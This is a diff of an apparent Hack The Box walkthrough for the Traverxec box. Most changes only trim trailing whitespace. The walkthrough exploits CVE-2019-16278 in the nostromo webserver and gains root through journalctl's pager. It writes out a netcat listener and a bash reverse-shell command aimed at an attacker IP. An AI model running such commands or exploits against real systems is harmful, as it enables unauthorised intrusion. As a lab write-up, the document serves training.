@@ -14,7 +14,7 @@ categories: ["Walkthrough", "HTB", "Linux", "Easy"]
 
 ## INTRODUCTION
 
-Traverxec is an older box, dating back to 2019, created by a reasonably-famous HTB user named **jkr**. It prominently features a very minimal webserver called **Nostromo**. Nostromo is a quick win, reinforcing some key pentesting fundamentals: checking for CVEs and vulnerability recognition while on the local system (after gaining foothold). The procedure for this box is fairly straightforward - a little Linux knowledge will grant the root flag. 
+Traverxec is an older box, dating back to 2019, created by a reasonably-famous HTB user named **jkr**. It prominently features a very minimal webserver called **Nostromo**. Nostromo is a quick win, reinforcing some key pentesting fundamentals: checking for CVEs and vulnerability recognition while on the local system (after gaining foothold). The procedure for this box is fairly straightforward - a little Linux knowledge will grant the root flag.
 
 > I wrote this walkthrough before I had figured out a methodical and consistent way to take notes. Please excuse the haphazard formatting and brevity.
 
@@ -48,13 +48,13 @@ Host is up (0.19s latency).
 Not shown: 998 filtered tcp ports (no-response)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
 |   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
 |_  256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
 80/tcp open  http    nostromo 1.9.6
 |_http-server-header: nostromo 1.9.6
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST
 |_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
 |_http-title: TRAVERXEC
@@ -107,13 +107,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ### CVE-2019-16278
 
-The nmap scans show that the webserver is **nostromo 1.9.6**. Checked searchsploit for that version. 
+The nmap scans show that the webserver is **nostromo 1.9.6**. Checked searchsploit for that version.
 
 ![searchsploit](searchsploit.png)
 
- ==> Yep there is an exploit! 👏 
+ ==> Yep there is an exploit! 👏
 
-I took a copy of the exploit. However, I had to modify the exploit very slightly: comment out one line. Change one string to `bytes(____,'utf-8')` encoding 
+I took a copy of the exploit. However, I had to modify the exploit very slightly: comment out one line. Change one string to `bytes(____,'utf-8')` encoding
 
 Next, I opened the firewall, set up a listener, and ran the exploit as follows:
 
@@ -127,7 +127,7 @@ nc -lvnp 4444
 python3 ./47837.py 10.10.10.165 80 "bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'"
 ```
 
-🎉 Got a reverse shell. 
+🎉 Got a reverse shell.
 
 
 
@@ -239,7 +239,7 @@ homedirs_public         public_www
 
 ```
 
-Ahhh ok. So david has a directory `/home/david/public_www/` that is accessible by the webserver. 
+Ahhh ok. So david has a directory `/home/david/public_www/` that is accessible by the webserver.
 ex if `/home/david/public_www/subdir` exists on the filesystem, then we can access it by the url:
 
 http://traverxec.htb/~david/subdir/
@@ -333,7 +333,7 @@ There are two files within: server-stats.head and server-stats.sh. This is serve
                                                               '"")---(""' |___.|
                                                              /:::::::::::\"    "
                                                             /:::=======:::\
-                                                        jgs '"""""""""""""' 
+                                                        jgs '"""""""""""""'
 
 ```
 
@@ -352,7 +352,7 @@ echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
 echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
 echo " "
 echo "Last 5 journal log lines:"
-/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
 ```
 
 
@@ -367,7 +367,7 @@ Just run the `sudo` part of the final line by itself
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 ```
 
-Make sure to shrink the window down to **fewer than 5 lines tall**. this way, `less` has to scroll, so the -n5 flag doesnt make it terminate immediately. If `less` doesnt terminate, you can run a shell through it! 
+Make sure to shrink the window down to **fewer than 5 lines tall**. this way, `less` has to scroll, so the -n5 flag doesnt make it terminate immediately. If `less` doesnt terminate, you can run a shell through it!
 
 I used it to spawn a **bash reverse shell** and baboom root access 🎉
 
@@ -379,10 +379,10 @@ I used it to spawn a **bash reverse shell** and baboom root access 🎉
 
 ### Attacker
 
-- **Once you know the application and version, spend a minute looking for known vulnerabilities**. I was glad that I checked this right away, as I may have wasted a lot of time enumerating the server or reading source code. 
+- **Once you know the application and version, spend a minute looking for known vulnerabilities**. I was glad that I checked this right away, as I may have wasted a lot of time enumerating the server or reading source code.
 - **Recognize which hashes are easy to crack**. Having knowledge of which hash algorithms are easy to crack (and which are hard) is valuable. I knew right away that MD5 would crack very very quickly, so I wasn't afraid to throw it into `john`. It helps a lot that HTB only ever uses `rockyou.txt`.
-  {{% /lessons-learned %}}
 - **Many common programs have a feature to run shell commands**. This is especially true for older programs that rose to popularity before multi-window environments. Keep these programs in-mind as privesc vectors. Also remember that a program like `less` might be disguised as `journalctl`, `pager`, etc.
+{{% /lessons-learned %}}
 
 {{% lessons-learned defender=true %}}
 
